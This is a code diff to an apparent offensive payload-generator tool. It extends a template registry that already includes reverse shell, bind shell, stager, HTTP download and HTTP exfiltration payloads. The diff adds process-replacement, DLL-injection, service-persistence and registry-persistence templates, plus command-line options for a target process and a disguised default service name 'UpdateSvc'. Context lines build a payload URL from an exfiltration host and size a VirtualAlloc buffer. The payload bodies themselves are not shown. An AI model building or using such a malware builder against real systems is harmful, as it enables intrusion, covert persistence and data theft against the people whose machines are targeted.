@@ -756,6 +756,10 @@ def _load_template(name: str) -> PayloadTemplate:
         "bind_shell":     "Tools.emitter.payload_templates.bind_shell.BindShellTemplate",
         "http_download":  "Tools.emitter.payload_templates.http_download.HttpDownloadTemplate",
         "http_exfil":     "Tools.emitter.payload_templates.http_exfil.HttpExfilTemplate",
+        "process_replace": "Tools.emitter.payload_templates.process_replace.ProcessReplaceTemplate",
+        "service_persist": "Tools.emitter.payload_templates.service_persist.ServicePersistTemplate",
+        "dll_inject":      "Tools.emitter.payload_templates.dll_inject.DllInjectTemplate",
+        "registry_persist": "Tools.emitter.payload_templates.registry_persist.RegistryPersistTemplate",
     }
     if name not in registry:
         raise ValueError(
@@ -780,6 +784,8 @@ _CONFIG_TO_LABEL: dict[str, str] = {
     "url": "url",
     "url_path": "url_path",
     "lhost": "exfil_host",
+    "process_name": "process_name",
+    "service_name": "service_name",
 }
 
 
@@ -830,6 +836,10 @@ def _apply_config_overrides(manifest: Manifest, config: TemplateConfig) -> Manif
         config.url = f"http://{config.lhost}:{config.lport}/payload.exe"
     if config.url_path is None:
         config.url_path = "/exfil"
+    if config.process_name is None:
+        config.process_name = "target.exe"
+    if config.service_name is None:
+        config.service_name = "UpdateSvc"
 
     if not changed:
         return manifest
@@ -1207,7 +1217,7 @@ def main() -> None:
     parser.add_argument("manifest", help="Path to manifest YAML file")
     parser.add_argument(
         "--template",
-        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download", "http_exfil"],
+        choices=["reverse_shell", "run_command", "copy_file", "copy_then_run", "move_then_run", "tcp_download", "tcp_stager", "bind_shell", "http_download", "http_exfil", "process_replace", "service_persist", "dll_inject", "registry_persist"],
     )
     parser.add_argument("--out", default="emitter_out", help="Output directory")
     parser.add_argument("--lhost", default=None, metavar="IP|IFACE",
@@ -1219,6 +1229,10 @@ def main() -> None:
     parser.add_argument("--command", default=None)
     parser.add_argument("--src", default=None)
     parser.add_argument("--dst", default=None)
+    parser.add_argument("--process-name", default=None,
+                        help="Target process name for process_replace template")
+    parser.add_argument("--service-name", default=None,
+                        help="Service name for service_persist template")
     parser.add_argument("--url", default=None, help="URL for http_download template")
     parser.add_argument("--payload-file", default=None, metavar="PATH",
                         help="Local file being served; sets VirtualAlloc size "
@@ -1269,6 +1283,8 @@ def main() -> None:
         url=args.url,
         url_path=url_path,
         alloc_size=alloc_size,
+        process_name=args.process_name,
+        service_name=args.service_name,
     )
 
     result = build(
